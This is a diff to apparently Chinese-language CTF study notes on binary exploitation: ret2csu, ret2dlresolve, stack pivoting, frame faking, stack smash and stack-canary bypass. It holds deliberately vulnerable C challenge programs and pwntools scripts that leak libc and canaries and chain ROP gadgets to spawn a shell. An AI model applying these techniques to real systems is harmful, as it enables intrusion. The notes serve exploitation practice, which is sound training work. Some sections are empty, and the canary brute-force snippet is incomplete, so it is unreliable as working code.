@@ -444,17 +444,77 @@ io.interactive()
 
  利用 x64 下的 __libc_csu_init 中的 gadgets.
 
+eg:level5:
+
+```c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+	write(STDOUT_FILENO, "Hello, World\n", 13);
+	vulnerable_function();
+}
+```
+
+exp:
+
+```python
+
+```
+
 
 
 ###### ret2reg
 
+- 略 无题目
+
 ###### BROP
+
+- 略 无二进制
 
 ##### 高级ROP
 
 ###### ret2_dl_runtime_resolve
 
+XDCTF2015-pwn200
+
+```c
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void vuln()
+{
+    char buf[100];
+    setbuf(stdin, buf);
+    read(0, buf, 256);
+}
+int main()
+{
+    char buf[100] = "Welcome to XDCTF2015~!\n";
+
+    setbuf(stdout, buf);
+    write(1, buf, strlen(buf));
+    vuln();
+    return 0;
+}
+//gcc -o bof -m32 -fno-stack-protector bof.c
+```
+
+
+
+
+
 ###### SROP
+
+
 
 ###### ret2VDSO
 
@@ -462,7 +522,204 @@ io.interactive()
 
 ##### 花式栈溢出
 
+- stack pivoting
+
+ [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) 
+
+
+
+转移堆：[EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)
+
+
+
+- frame faking
+
+2018 安恒杯 over
+
+![](https://my-md-1253484710.file.myqcloud.com/20190522130814.png)
+
+
+
+直接EXP 分析，，困扰了很久的exp
+
+```python
+from pwn import *
+context.binary = "./over.over"
+
+def DEBUG(cmd):
+    raw_input("DEBUG: ")
+    gdb.attach(io, cmd)
+
+io = process("./over.over")
+elf = ELF("./over.over")
+libc = elf.libc
+
+io.sendafter(">", 'a' * 80)
+stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
+success("stack -> {:#x}".format(stack))
+
+
+#  DEBUG("b *0x4006B9\nc") 96
+io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
+libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
+success("libc.address -> {:#x}".format(libc.address))
+
+pop_rdi_ret=0x400793
+'''
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
+0x00000000000f5279 : pop rdx ; pop rsi ; ret
+'''
+pop_rdx_pop_rsi_ret=libc.address+0xf5279
+
+
+payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])
+
+io.sendafter(">", payload)
+
+io.interactive()
+
+```
+
+
+
+- Stack smash
+
+35c3 CTF readme
+
+![](https://my-md-1253484710.file.myqcloud.com/20190522132544.png)
+
+```python
+from pwn import *
+
+addr_ow_flag = 0x600d20
+addr_flag = 0x400d20
+
+H,P = 'localhost', 6666
+
+#r = process('./readme.bin')
+r = remote(H,P)
+junk  = r.recvuntil("What's your name? ")
+exploit  = "A"*0x218
+exploit += p64(addr_flag)
+exploit += p64(0)
+exploit += p64(addr_ow_flag)
+r.sendline(exploit)
+junk += r.recvuntil("Please overwrite the flag: ")
+exploit  = "LIBC_FATAL_STDERR_=1"
+r.sendline(exploit)
+junk += r.recvall()
+print junk
+
+```
+
+
+
+
+
+- 栈上partial overwrite
+
+2018 安恒杯 babypie
+
+
+
+2018 XNUCA-gets
+
 ##### Canary 绕过技术
+
+- 泄露栈中的Canary
+
+  覆盖 Canary 的低字节，来打印出剩余的 Canary 部分
+
+  ```c
+  // ex2.c
+  #include <stdio.h>
+  #include <unistd.h>
+  #include <stdlib.h>
+  #include <string.h>
+  void getshell(void) {
+      system("/bin/sh");
+  }
+  void init() {
+      setbuf(stdin, NULL);
+      setbuf(stdout, NULL);
+      setbuf(stderr, NULL);
+  }
+  void vuln() {
+      char buf[100];
+      for(int i=0;i<2;i++){
+          read(0, buf, 0x200);
+          printf(buf);
+      }
+  }
+  int main(void) {
+      init();
+      puts("Hello Hacker!");
+      vuln();
+      return 0;
+  }
+  ```
+
+  EXP
+
+  ```python
+  #!/usr/bin/env python
+   
+  from pwn import *
+   
+  context.binary = 'ex2'#全局系统自动设置，为官方推荐设置，ex2为文件名称。
+  #context.log_level = 'debug'#debug模式下才开启
+  io = process('./ex2') #本地连接到ex2
+   
+  get_shell = ELF("./ex2").sym["getshell"] #由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。
+   
+  io.recvuntil("Hello Hacker!\n")#接受传来的第一部分字符
+   
+  # leak Canary
+  payload = "A"*100 
+  io.sendline(payload) #传输100个A
+   
+  io.recvuntil("A"*100)
+  Canary = u32(io.recv(4))-0xa #因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a
+  log.info("Canary:"+hex(Canary))#日志记录下canary
+   
+  # Bypass Canary
+  payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)#发送最后的payload
+  io.send(payload)
+   
+  io.recv()
+   
+  io.interactive()
+  ```
+
+- one-by-one 爆破 Canary
+
+  ```python
+  print "[+] Brute forcing stack canary "
+  
+  start = len(p)
+  stop = len(p)+8
+  
+  while len(p) < stop:
+     for i in xrange(0,256):
+        res = send2server(p + chr(i))
+  
+        if res != "":
+           p = p + chr(i)
+           #print "\t[+] Byte found 0x%02x" % i
+           break
+  
+        if i == 255:
+           print "[-] Exploit failed"
+           sys.exit(-1)
+  
+  
+  canary = p[stop:start-1:-1].encode("hex")
+  print "   [+] SSP value is 0x%s" % 
+  ```
+
+- canary劫持__stack_chk_fail 函数
+
+- 覆盖 TLS 中储存的 Canary 值
 
 
 
